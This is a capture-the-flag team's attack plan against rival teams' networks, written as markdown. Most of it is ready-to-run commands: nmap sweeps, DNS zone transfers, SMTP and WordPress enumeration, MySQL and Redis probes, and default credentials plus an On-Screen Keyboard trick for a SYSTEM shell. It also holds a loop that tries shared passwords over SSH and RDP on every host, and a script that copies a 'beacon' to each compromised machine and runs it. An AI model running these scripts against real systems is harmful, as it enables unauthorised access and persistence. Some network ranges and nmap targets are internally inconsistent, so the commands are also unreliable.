# 🎯 Day 2 Attack Plan - B4FFL3G4P CTF

## 📊 Network Architecture

### 🏴‍☠️ **Red Team Network:**
- **Range:** `100.80.1.0/16`
- **Target:** All Blue Teams

### 🔵 **Blue Team Networks:**

#### **BT1 (Our Team) - 100.80.2-3.x:**
- **Range:** `100.80.2.0/16` and `100.80.3.0/16`
- **Key Infrastructure:**
  - `ns0` - `100.80.2.132` (DNS Server)
  - `mail0` - `100.80.3.15` (Mail Server)
  - `mail1` - `100.80.3.16` (Backup Mail)
  - `podctl0` - `100.80.3.50` (Pod Controller)
  - `podwrk0` - `100.80.3.51` (Pod Worker)
  - `podwrk1` - `100.80.3.52` (Pod Worker)

#### **BT2 - 100.80.4-5.x:**
- **Range:** `100.80.4.0/16` and `100.80.5.0/16`
- **Target Infrastructure:** Similar to BT1 but with 4-5 octets

#### **BT3 - 100.80.6-7.x:**
- **Range:** `100.80.6.0/16` and `100.80.7.0/16`
- **Target Infrastructure:** Similar to BT1 but with 6-7 octets

#### **BT4 - 100.80.8-9.x:**
- **Range:** `100.80.8.0/16` and `100.80.9.0/16`
- **Target Infrastructure:** Similar to BT1 but with 8-9 octets

## 🎯 **Attack Strategy**

### **Phase 1: Reconnaissance**
1. **Network Discovery:**
   ```bash
   # Scan enemy networks
   nmap -sn 100.80.4.0/16  # BT2
   nmap -sn 100.80.5.0/16  # BT2
   nmap -sn 100.80.6.0/16  # BT3
   nmap -sn 100.80.7.0/16  # BT3
   nmap -sn 100.80.8.0/16  # BT4
   nmap -sn 100.80.9.0/16  # BT4
   ```

2. **Service Discovery:**
   ```bash
   # Find DNS servers
   nmap -p 53 100.80.4.0/16,100.80.5.0/16,100.80.6.0/16,100.80.7.0/16,100.80.8.0/16,100.80.9.0/16
   
   # Find mail servers
   nmap -p 25,587,465 100.80.4.0/16,100.80.5.0/16,100.80.6.0/16,100.80.7.0/16,100.80.8.0/16,100.80.9.0/16
   
   # Find web servers
   nmap -p 80,443,8080 100.80.4.0/16,100.80.5.0/16,100.80.6.0/16,100.80.7.0/16,100.80.8.0/16,100.80.9.0/16
   ```

### **Phase 2: DNS Attacks**
1. **Zone Transfer Attempts:**
   ```bash
   # Try zone transfers on enemy DNS servers
   dig @100.80.4.132 AXFR B4FFL3G4P.bslv.prod.ctf
   dig @100.80.6.132 AXFR B4FFL3G4P.bslv.prod.ctf
   dig @100.80.8.132 AXFR B4FFL3G4P.bslv.prod.ctf
   ```

2. **DNS Enumeration:**
   ```bash
   # Enumerate subdomains
   for ip in 100.80.4.132 100.80.6.132 100.80.8.132; do
     dig @$ip ANY B4FFL3G4P.bslv.prod.ctf
   done
   ```

### **Phase 3: Mail Server Attacks**
1. **SMTP Enumeration:**
   ```bash
   # Test mail servers
   for ip in 100.80.4.15 100.80.6.15 100.80.8.15; do
     telnet $ip 25
     telnet $ip 587
   done
   ```

2. **Mail Server Exploitation:**
   ```bash
   # Try common mail exploits
   # - Open relay testing
   # - User enumeration
   # - Mail injection
   ```

### **Phase 4: Web Application Attacks**
1. **Web Server Discovery:**
   ```bash
   # Find web applications
   dirb http://100.80.4.164  # wp0 equivalent
   dirb http://100.80.6.164  # wp0 equivalent
   dirb http://100.80.8.164  # wp0 equivalent
   ```

2. **Application Enumeration:**
   ```bash
   # WordPress enumeration
   wpscan --url http://100.80.4.164
   wpscan --url http://100.80.6.164
   wpscan --url http://100.80.8.164
   ```

### **Phase 5: Database Attacks**
1. **MySQL Enumeration:**
   ```bash
   # Test MySQL servers
   for ip in 100.80.4.149 100.80.6.149 100.80.8.149; do
     nmap -p 3306 --script mysql-info $ip
   done
   ```

2. **Redis Enumeration:**
   ```bash
   # Test Redis servers
   for ip in 100.80.4.166 100.80.6.166 100.80.8.166; do
     nmap -p 6379 --script redis-info $ip
   done
   ```

## 🔑 **Default Credentials**

### **Windows Machines:**
- **Username:** `Administrator`, `User`, `icanhasaccess`
- **Password:** `P@55w0rd1!` or blank password
- **OSK Trick:** On-Screen Keyboard at login gives SYSTEM terminal

### **Linux Machines:**
- **Username:** `icanhasaccess`, `goldteamscoring`
- **Password:** `P@55w0rd1!` or blank password

### **pfSense Firewalls:**
- **Username:** `root` or `admin`
- **Password:** `pfsense`

## 🛠️ **Attack Tools & Scripts**

### **Network Scanner:**
```bash
#!/bin/bash
# scan_enemy_networks.sh
for team in "4-5" "6-7" "8-9"; do
  echo "Scanning BT team $team..."
  nmap -sn 100.80.$team.0/16
done
```

### **DNS Reconnaissance:**
```bash
#!/bin/bash
# dns_recon.sh
for team in "4" "6" "8"; do
  echo "DNS recon on BT team $team..."
  dig @100.80.$team.132 AXFR B4FFL3G4P.bslv.prod.ctf
done
```

### **Service Enumeration:**
```bash
#!/bin/bash
# service_enum.sh
for team in "4" "6" "8"; do
  echo "Service enum on BT team $team..."
  nmap -sV -sC 100.80.$team.0/24
done
```

### **Red Team Account Access:**
```bash
#!/bin/bash
# red_team_access.sh
for team in "4" "6" "8"; do
  for ip in $(seq 1 254); do
    echo "Testing red team accounts on 100.80.$team.$ip..."
    
    # SSH with red team accounts
    sshpass -p 'P@55w0rd1!' ssh -o ConnectTimeout=5 icanhasaccess@100.80.$team.$ip
    sshpass -p 'P@55w0rd1!' ssh -o ConnectTimeout=5 goldteamscoring@100.80.$team.$ip
    
    # RDP with red team accounts
    xfreerdp /v:100.80.$team.$ip /u:icanhasaccess /p:P@55w0rd1!
    xfreerdp /v:100.80.$team.$ip /u:goldteamscoring /p:P@55w0rd1!
  done
done
```

### **Beacon Deployment:**
```bash
#!/bin/bash
# deploy_beacon.sh
for team in "4" "6" "8"; do
  for ip in $(seq 1 254); do
    echo "Deploying beacon to 100.80.$team.$ip..."
    
    # Upload beacon via SSH
    scp beacon.sh icanhasaccess@100.80.$team.$ip:/tmp/
    ssh icanhasaccess@100.80.$team.$ip "chmod +x /tmp/beacon.sh && /tmp/beacon.sh"
    
    # Upload beacon via RDP
    # Use psexec or similar for Windows
  done
done
```

## 📊 **Target Priority Matrix**

### **High Priority Targets:**
1. **DNS Servers** (`100.80.4.132`, `100.80.6.132`, `100.80.8.132`)
   - Zone transfer attempts
   - DNS cache poisoning
   - DNS amplification

2. **Mail Servers** (`100.80.4.15`, `100.80.6.15`, `100.80.8.15`)
   - Open relay testing
   - User enumeration
   - Mail injection

3. **Web Servers** (`100.80.4.164`, `100.80.6.164`, `100.80.8.164`)
   - WordPress vulnerabilities
   - Directory traversal
   - SQL injection

### **Medium Priority Targets:**
1. **Database Servers** (MySQL, Redis)
2. **File Servers** (Samba)
3. **Application Servers** (Drupal, MediaWiki)

### **Low Priority Targets:**
1. **Windows Servers** (for lateral movement)
2. **Linux Servers** (for persistence)

## 🎯 **Success Metrics**

### **DNS Attacks:**
- [ ] Zone transfer successful
- [ ] DNS cache poisoned
- [ ] DNS amplification achieved

### **Mail Attacks:**
- [ ] Open relay found
- [ ] User enumeration successful
- [ ] Mail injection successful

### **Web Attacks:**
- [ ] WordPress admin access
- [ ] SQL injection successful
- [ ] File upload achieved

### **Database Attacks:**
- [ ] MySQL access gained
- [ ] Redis access gained
- [ ] Data exfiltration successful

## 📋 **Attack Checklist**

### **Pre-Attack:**
- [ ] Network discovery complete
- [ ] Service enumeration done
- [ ] Vulnerability assessment complete
- [ ] Attack tools prepared

### **During Attack:**
- [ ] DNS attacks executed
- [ ] Mail server attacks attempted
- [ ] Web application attacks launched
- [ ] Database attacks performed
- [ ] Lateral movement achieved

### **Post-Attack:**
- [ ] Persistence established
- [ ] Data exfiltration completed
- [ ] Evidence collection done
- [ ] Cleanup performed

## 🚨 **Defense Considerations**

### **Our Infrastructure Protection:**
1. **DNS Security:**
   - Zone transfer restrictions
   - DNSSEC implementation
   - DNS monitoring

2. **Mail Security:**
   - SMTP authentication
   - Relay restrictions
   - Mail filtering

3. **Web Security:**
   - Application firewalls
   - Input validation
   - Regular updates

4. **Network Security:**
   - Firewall rules
   - IDS/IPS deployment
   - Network monitoring

## 📊 **Intelligence Gathering**

### **Target Information:**
- **BT2:** 100.80.4-5.x range
- **BT3:** 100.80.6-7.x range  
- **BT4:** 100.80.8-9.x range
- **Red Team:** 100.80.1.x range

### **Our Infrastructure:**
- **BT1:** 100.80.2-3.x range
- **Key Services:** DNS, Mail, Web, Database
- **Defense Posture:** Active monitoring and response

---

**🎯 Ready for Day 2 Attack Operations!** 